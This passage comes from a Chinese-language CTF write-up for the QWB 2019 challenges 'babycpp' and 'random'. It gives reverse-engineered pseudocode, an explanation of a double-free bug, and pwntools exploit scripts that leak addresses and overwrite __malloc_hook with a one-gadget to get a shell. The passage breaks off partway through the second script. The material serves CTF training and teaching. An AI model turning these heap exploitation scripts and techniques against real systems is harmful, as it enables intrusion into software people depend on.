$text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *($text_base+0x000000000000C37)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(address)</span>:</span></span><br><span class="line">    n = globals()</span><br><span class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> n.items():</span><br><span class="line">        <span class="keyword">if</span> value == address:</span><br><span class="line">            <span class="keyword">return</span> success(key+<span class="string">"  ==&gt;  "</span>+hex(address))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"Your choice:"</span>,str(idx))</span><br><span class="line">hash = []</span><br><span class="line">number  = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(flag)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> number</span><br><span class="line">    <span class="keyword">global</span> hash</span><br><span class="line">    menu(<span class="number">0</span>)</span><br><span class="line">    menu(flag)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"number :"</span>+str(number)</span><br><span class="line">    hash.append(p8(number)+<span class="string">'\x00'</span>)</span><br><span class="line">    number+=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx1,idx2)</span>:</span><span class="comment">#idx1 array_idx , idx2 element_idx</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.sendafter(<span class="string">"Input array hash:"</span>,hash[idx1])</span><br><span class="line">    a.sendlineafter(<span class="string">"Input idx:"</span>,str(idx2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">StringNewElement</span><span class="params">(idx1,idx2,len,content)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.sendafter(<span class="string">"hash:"</span>,hash[idx1])</span><br><span class="line">    a.sendlineafter(<span class="string">"Input idx:"</span>,str(idx2))</span><br><span class="line">    a.sendlineafter(<span class="string">"Input the len of the obj:"</span>,str(len))</span><br><span class="line">    a.sendafter(<span class="string">"Input your content:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">StringEdit</span><span class="params">(idx1,idx2,content)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.sendafter(<span class="string">"hash:"</span>,hash[idx1])</span><br><span class="line">    a.sendlineafter(<span class="string">"Input idx:"</span>,str(idx2))</span><br><span class="line">    a.sendafter(<span class="string">"Input your content:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntEdit</span><span class="params">(idx1,idx2,value)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.sendafter(<span class="string">"hash:"</span>,hash[idx1])</span><br><span class="line">    a.sendlineafter(<span class="string">"Input idx:"</span>,str(idx2))</span><br><span class="line">    a.sendlineafter(<span class="string">"Input val:"</span>,(value))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UpdateHash</span><span class="params">(idx1,idx2,hash1)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.sendafter(<span class="string">"hash:"</span>,hash[idx1])</span><br><span class="line">    a.sendlineafter(<span class="string">"Input idx:"</span>,str(idx2))</span><br><span class="line">    a.sendafter(<span class="string">":"</span>,hash1)</span><br><span class="line">IntVtable = <span class="string">'\xe0\x5c'</span></span><br><span class="line">StringVtable = <span class="string">'\x00\x5d'</span></span><br><span class="line">add(<span class="number">1</span>)<span class="comment"># 0 IntArray</span></span><br><span class="line">add(<span class="number">2</span>)<span class="comment"># 1 StringArray</span></span><br><span class="line">add(<span class="number">2</span>)<span class="comment"># 2 StringArray</span></span><br><span class="line"></span><br><span class="line">StringNewElement(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">'A'</span>)</span><br><span class="line">UpdateHash(<span class="number">1</span>,<span class="number">0x80000000</span>,IntVtable)<span class="comment"># baopo</span></span><br><span class="line">show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">a.recvuntil(<span class="string">"is "</span>)</span><br><span class="line">heap_base = int(a.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)<span class="number">-0x120b0</span></span><br><span class="line">fuck(heap_base)</span><br><span class="line"></span><br><span class="line">target_addr = <span class="number">0x555555768e70</span><span class="number">-0x555555757000</span>+heap_base</span><br><span class="line">payload = p64(target_addr)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">StringNewElement(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x100</span>,payload)</span><br><span class="line">target_addr = <span class="number">0x555555769200</span> - <span class="number">0x555555757000</span>+heap_base</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">IntEdit(<span class="number">1</span>,<span class="number">0</span>,hex(target_addr))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">UpdateHash(<span class="number">1</span>,<span class="number">0x80000000</span>,StringVtable)</span><br><span class="line">show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">a.recvuntil(<span class="string">"tent:"</span>)</span><br><span class="line">text_base = u64(a.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x000000000201CE0</span></span><br><span class="line">fuck(text_base)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>] + text_base</span><br><span class="line">payload = p64(puts_got)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">StringEdit(<span class="number">2</span>,<span class="number">0</span>,payload)</span><br><span class="line">UpdateHash(<span class="number">1</span>,<span class="number">0x80000000</span>,IntVtable)</span><br><span class="line">IntEdit(<span class="number">1</span>,<span class="number">0</span>,hex(target_addr))</span><br><span class="line">UpdateHash(<span class="number">1</span>,<span class="number">0x80000000</span>,StringVtable)</span><br><span class="line">show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">a.recvuntil(<span class="string">"tent:"</span>)</span><br><span class="line">puts_addr=u64(a.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">fuck(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">fuck(libc_base)</span><br><span class="line">__malloc_hook = libc_base + libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">one = libc_base+ <span class="number">0x4f2c5</span></span><br><span class="line">fuck(__malloc_hook)</span><br><span class="line">fuck(one)</span><br><span class="line">payload = p64(__malloc_hook<span class="number">-8</span>)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">StringEdit(<span class="number">2</span>,<span class="number">0</span>,payload)</span><br><span class="line">UpdateHash(<span class="number">1</span>,<span class="number">0x80000000</span>,IntVtable)</span><br><span class="line">IntEdit(<span class="number">1</span>,<span class="number">0</span>,hex(target_addr))</span><br><span class="line">UpdateHash(<span class="number">1</span>,<span class="number">0x80000000</span>,StringVtable)</span><br><span class="line">StringEdit(<span class="number">1</span>,<span class="number">0</span>,p64(one)+p64(libc_base+libc.symbols[<span class="string">"realloc"</span>]+<span class="number">6</span>))</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>程序流程比较复杂,需要逆向一段时间…</p>
+<p>程序把需要执行的函数信息都保存在一个结构体中:<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00000000 </span>func_chunk      struc ; (sizeof=<span class="number">0</span>x18, mappedto_6)</span><br><span class="line"><span class="symbol">00000000 </span>fd              dq ?</span><br><span class="line"><span class="symbol">00000008 </span>func_ptr        dq ?</span><br><span class="line"><span class="symbol">00000010 </span>flag            dq ?</span><br><span class="line"><span class="symbol">00000018 </span>func_chunk      ends</span><br></pre></td></tr></table></figure></p>
+<p>使用下面的函数进行创建.<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 *__fastcall DoCallocFunc(__int64 func, int flag)</span><br><span class="line">&#123;</span><br><span class="line">  func_chunk *v2<span class="comment">; // rax</span></span><br><span class="line">  func_chunk *v3<span class="comment">; // rdx</span></span><br><span class="line">  __int64 *result<span class="comment">; // rax</span></span><br><span class="line">  v2 = (func_chunk *)calloc(<span class="number">1</span>uLL, <span class="number">0x18</span>uLL)<span class="comment">;</span></span><br><span class="line">  v2-&gt;flag = flag<span class="comment">;</span></span><br><span class="line">  v2-&gt;func_ptr = func<span class="comment">;</span></span><br><span class="line">  v2-&gt;fd = header<span class="comment">;</span></span><br><span class="line">  v3 = v2<span class="comment">;</span></span><br><span class="line">  result = &amp;header<span class="comment">;</span></span><br><span class="line">  header = (__int64)v3<span class="comment">;</span></span><br><span class="line">  return result<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>需要执行的函数用一个单向链表串起来.</p>
+<p>执行的时候用以下函数进行遍历:<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="type">RunFunc</span>(<span class="built_in">int</span> flag)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *<span class="literal">result</span>; // rax</span><br><span class="line">  func_chunk *<span class="keyword">ptr</span>; // [rsp+<span class="number">10</span>h] [rbp-<span class="number">20</span>h]</span><br><span class="line">  func_chunk *<span class="type">Targe_fd</span>; // [rsp+<span class="number">18</span>h] [rbp-<span class="number">18</span>h]</span><br><span class="line">  func_chunk *<span class="type">Target_bk</span>; // [rsp+<span class="number">20</span>h] [rbp-<span class="number">10</span>h]</span><br><span class="line">  <span class="built_in">void</span> (__fastcall *current_func_ptr)(func_chunk *); // [rsp+<span class="number">28</span>h] [rbp-<span class="number">8</span>h]</span><br><span class="line"></span><br><span class="line">  <span class="literal">result</span> = (_QWORD *)header;</span><br><span class="line">  <span class="keyword">if</span> ( header )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">ptr</span> = (func_chunk *)header;</span><br><span class="line">    <span class="type">Target_bk</span> = (func_chunk *)header;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="keyword">ptr</span>-&gt;flag != flag )               // 遍历，寻找对应的flag的chunk</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">Target_bk</span> = <span class="keyword">ptr</span>;</span><br><span class="line">        <span class="literal">result</span> = (_QWORD *)<span class="keyword">ptr</span>-&gt;fd;</span><br><span class="line">        <span class="keyword">ptr</span> = (func_chunk *)<span class="keyword">ptr</span>-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="keyword">ptr</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">result</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      current_func_ptr = (<span class="built_in">void</span> (__fastcall *)(func_chunk *))<span class="keyword">ptr</span>-&gt;func_ptr;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="keyword">ptr</span> == (func_chunk *)header )        // 将要执行的函数的chunk是链表头</span><br><span class="line">      &#123;</span><br><span class="line">        header = <span class="keyword">ptr</span>-&gt;fd;</span><br><span class="line">        <span class="type">Target_bk</span> = (func_chunk *)header;</span><br><span class="line">        <span class="type">Targe_fd</span> = (func_chunk *)header;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">Target_bk</span>-&gt;fd = <span class="keyword">ptr</span>-&gt;fd;                // 将他从链表中取出</span><br><span class="line">        <span class="type">Targe_fd</span> = (func_chunk *)<span class="keyword">ptr</span>-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      free(<span class="keyword">ptr</span>);</span><br><span class="line">      current_func_ptr(<span class="keyword">ptr</span>);</span><br><span class="line">      <span class="literal">result</span> = &amp;<span class="type">Targe_fd</span>-&gt;fd;</span><br><span class="line">      <span class="keyword">ptr</span> = <span class="type">Targe_fd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="type">Targe_fd</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>如果在add函数中进行增加add结构体的选项，这个遍历过程就会出现问题.<br>假设当遍历到add节点的时候，header指向的是add节点:<br><img src="/2019/09/30/QWB2019-babycpp-random复现/2.png" alt=""><br>此时Target_bk,Target_fd,ptr都指向add节点.<br>然后将add节点从当前链中取出:<br><img src="/2019/09/30/QWB2019-babycpp-random复现/3.png" alt=""><br>除了ptr，都指向了下一个节点.<br>然后在add中选择新增节点:<br><img src="/2019/09/30/QWB2019-babycpp-random复现/4.png" alt=""><br>执行完函数后，ptr也指向了下一个节点.</p>
+<p>然后下次循环时会执行这个分支:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     T<span class="function"><span class="title">arget_bk</span>-&gt;</span><span class="function"><span class="title">fd</span> = ptr-&gt;</span>fd;                <span class="comment">// 将他从链表中取出</span></span><br><span class="line">     T<span class="function"><span class="title">arge_fd</span> = (func_chunk *)ptr-&gt;</span>fd;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这个分支并不会将这个节点移除链表，free过后仍然留在链表上:<br><img src="/2019/09/30/QWB2019-babycpp-random复现/5.png" alt=""><br>这样当下次再执行这个节点的时候就又会将它free一次，这样就造成了double free.</p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用double free劫持全局数组，这样就可以任意读写了.</p>
+<p>一次add操作如果add的chunk size &lt; 0x20这样就可以消耗掉fastbin链上一个chunk，里double free的chunk就会近一个chunk.<br>选择每天玩多少次，就需要calloc多少次来创建chunk保存函数信息，这样可以吃掉fastbin链上的chunk.<br>选择一个合适的距离，选择玩游戏这个(距离)次过后正好calloc到这个double free chunk，且需要这一天第一次游戏正好是add函数.<br>由于RunFunc函数是先free掉保存这个函数信息的chunk，然后再执行函数，这样add函数就可以正好申请到这个double free chunk。</p>
+<h5 id="预测随机数"><a href="#预测随机数" class="headerlink" title="预测随机数:"></a>预测随机数:</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes import *</span><br><span class="line"><span class="attribute">libc</span>=CDLL("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">libc.srand(0)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(50):</span><br><span class="line">    <span class="attribute">choice</span>=libc.rand()%4</span><br><span class="line">    <span class="keyword">if</span> choice == 0:</span><br><span class="line">        <span class="builtin-name">print</span> str(i+1)+<span class="string">": add"</span></span><br><span class="line">    elif choice == 1:</span><br><span class="line">        <span class="builtin-name">print</span> str(i+1)+<span class="string">": edit"</span></span><br><span class="line">    elif choice == 2:</span><br><span class="line">        <span class="builtin-name">print</span> str(i+1)+<span class="string">": delete"</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="builtin-name">print</span> str(i+1)+<span class="string">": show"</span></span><br></pre></td></tr></table></figure>
+<h5 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">one_day(<span class="number">8</span>)<span class="comment">#1-8</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x11</span>,<span class="string">'A\n'</span>,<span class="string">'Y'</span>) <span class="comment">#增加一个add节点</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment"># double free chunk 0x555555758100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    do_pass()</span><br><span class="line">one_day(<span class="number">7</span>)<span class="comment">#9 - 15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>+<span class="number">2</span>): <span class="comment"># 7 + 1个add节点，然后delete节点再N</span></span><br><span class="line">    do_pass()</span><br></pre></td></tr></table></figure>
+<p>此时结果如下:<br><img src="/2019/09/30/QWB2019-babycpp-random复现/6.png" alt=""></p>
+<h5 id="修改fd"><a href="#修改fd" class="headerlink" title="修改fd"></a>修改fd</h5><p>然后选择玩两次，add到这个double free chunk，修改fd:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">one_day(<span class="number">2</span>)<span class="comment">#16 - 17</span></span><br><span class="line">add(<span class="number">0x11</span>,p64(ptr_addr+<span class="number">0x20</span>)+<span class="string">'\n'</span>,<span class="string">"N"</span>)</span><br><span class="line">do_pass()</span><br></pre></td></tr></table></figure></p>
+<h5 id="伪造size"><a href="#伪造size" class="headerlink" title="伪造size"></a>伪造size</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">one_day(<span class="number">5</span>)<span class="comment">#18 - 22</span></span><br><span class="line">add(<span class="number">0x21</span>,<span class="string">'A\n'</span>,<span class="string">"N"</span>)</span><br><span class="line">do_pass()</span><br><span class="line">add(<span class="number">0x21</span>,<span class="string">'A\n'</span>,<span class="string">'N'</span>)</span><br><span class="line">add(<span class="number">0x21</span>,<span class="string">'A\n'</span>,<span class="string">'N'</span>)</span><br><span class="line">do_pass()</span><br></pre></td></tr></table></figure>
+<p>伪造size是为了绕过free和malloc的检查,当申请到全局数组的时候需要有合法的size，保存结构体的chunk free的时候需要当前chunk的下一个chunk的size是合法的<br>最后就是找到合适的时机正好add到这个目标chunk即可.</p>
+<h4 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp:"></a>完整exp:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./random"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(a)</span>:</span></span><br><span class="line">    text_base = a.libs()[a._cwd+a.argv[<span class="number">0</span>].strip(<span class="string">'.'</span>)]</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> a.libs():</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"libc.so.6"</span> <span class="keyword">in</span> key:</span><br><span class="line">            <span class="keyword">return</span> text_base,a.libs()[key]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    text_base,libc_base=get_base(a)</span><br><span class="line">    script=<span class="string">"set $text_base="</span>+str(text_base)+<span class="string">'\n'</span>+<span class="string">"set $libc_base="</span>+str(libc_base)+<span class="string">'\n'</span></span><br><span class="line">    script+=<span class="string">'''</span></span><br><span class="line"><span class="string">    b *($text_base+0x0000000000011C4)</span></span><br><span class="line"><span class="string">    b *($text_base+0x00000000000011AC)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    gdb.attach(a,script)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_pass</span><span class="params">()</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">    a.sendline(<span class="string">"N"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dogame</span><span class="params">(flag)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        s = a.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> s:</span><br><span class="line">            a.sendline(<span class="string">"Y"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a.sendline(<span class="string">"N"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content,flag2)</span>:</span></span><br><span class="line">    dogame(<span class="string">"add"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Input the size of the note:\n"</span>,str(size))</span><br><span class="line">    a.sendafter(<span class="string">"Input the content of the note:"</span>,content)</span><br><span class="line">    a.sendlineafter(<span class="string">", tomorrow?(Y/N)\n"</span>,flag2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    dogame(<span class="string">"delete"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Input the index of the note:\n"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    dogame(<span class="string">"view"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Input the index of the note:\n"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    dogame(<span class="string">"update"</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Input the index of the note:\n"</span>,str(idx))</span><br><span class="line">    a.sendafter(<span class="string">"Input the new content of the note:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">'Please input your name:\n'</span>)</span><br><span class="line">    a.send(<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">    a.recvuntil(<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">    text_base = u64(a.recvuntil(<span class="string">'?'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xb90</span></span><br><span class="line">    a.sendlineafter(<span class="string">"\n"</span>,str(<span class="number">35</span>))</span><br><span class="line">    <span class="keyword">return</span> text_base</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">one_day</span><span class="params">(times)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"game today?(0~10)\n"</span>,str(times))</span><br><span class="line">text_base=init()</span><br><span class="line">success(<span class="string">"text_base ==&gt; 0x%x"</span>%text_base)</span><br><span class="line">ptr_addr = text_base+<span class="number">0x203180</span></span><br><span class="line">success(<span class="string">"info_array ==&gt; 0x%x"</span>%ptr_addr)</span><br><span class="line">one_day(<span class="number">8</span>)<span class="comment">#1-8</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x11</span>,<span class="string">'A\n'</span>,<span class="string">'Y'</span>) <span class="comment">#增加一个add节点</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment"># double free chunk 0x555555758100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    do_pass()</span><br><span class="line">one_day(<span class="number">7</span>)<span class="comment">#9 - 15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>+<span class="number">2</span>): <span class="comment"># 7 + 1个add节点，然后delete节点再N</span></span><br><span class="line">    do_pass()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">one_day(<span class="number">2</span>)<span class="comment">#16 - 17</span></span><br><span class="line">add(<span class="number">0x11</span>,p64(ptr_addr+<span class="number">0x20</span>)+<span class="string">'\n'</span>,<span class="string">"N"</span>)</span><br><span class="line">do_pass()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">one_day(<span class="number">5</span>)<span class="comment">#18 - 22</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x21</span>,<span class="string">'A\n'</span>,<span class="string">"N"</span>)<span class="comment">#伪造size</span></span><br><span class="line">do_pass()</span><br><span class="line">add(<span class="number">0x21</span>,<span class="string">'A\n'</span>,<span class="string">'N'</span>)<span class="comment">#伪造size</span></span><br><span class="line">add(<span 